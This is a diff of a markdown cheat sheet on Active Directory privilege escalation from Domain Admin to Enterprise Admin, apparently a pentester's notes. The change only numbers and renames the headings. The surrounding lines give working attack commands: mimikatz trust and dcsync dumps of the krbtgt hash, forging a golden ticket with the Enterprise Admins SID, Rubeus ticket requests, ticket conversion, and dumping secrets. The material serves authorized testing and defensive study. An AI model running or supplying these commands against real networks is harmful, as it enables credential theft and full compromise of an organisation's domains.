@@ -7,7 +7,7 @@ tags: ["kerberos", "da", "ea", "active directory", "ad", "domain controller", "W
 ---
 ### Privesc from DA to EA
 
-#### Check direction and target
+#### 1. Check direction and target
 
 ```powershell
 Get-ADTrust -Filter *
@@ -23,19 +23,19 @@ nltest /domain_trusts
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 ```
 
-#### Get current and target domain SID
+#### 2. Get current and target domain SID
 
 ```powershell
 ./mimikatz.exe 'lsadump::trust' 'exit'
 ```
 
-#### Get krbtgt hash of current domain
+#### 3. Get krbtgt hash of current domain
 
 ```powershell
 ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit'
 ```
 
-#### Forge a golden ticket
+#### 4. Forge a golden ticket
 
 ```powershell
 # Append '-519' to target domain SID
@@ -44,13 +44,13 @@ nltest /domain_trusts
 
 <small>*Note: May need to try different high value hashes*</small>
 
-#### Request a tgt ticket of target domain
+#### 5. Request a tgt ticket of target domain
 
 ```powershell
 ./rubeus.exe asktgs /service:cifs/TARGET.EXAMPLE.COM /domain:EXAMPLE.COM /dc:DC01.EXAMPLE.COM /ticket:c:\windows\tasks\ticket.kirbi /outfile:c:\windows\tasks\ticket_2.kirbi /nowrap
 ```
 
-#### Convert kirbi to ccache (Back to Linux)
+#### 6. Convert kirbi to ccache (Back to Linux)
 
 [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)
 
@@ -58,7 +58,7 @@ nltest /domain_trusts
 python3 rubeustoccache.py <base64_encoded_ticket> secrets.kirbi secrets.ccache
 ```
 
-#### secretdump
+#### 7. Dump Secrets
 
 ```bash
 export KRB5CCNAME=secrets.ccache
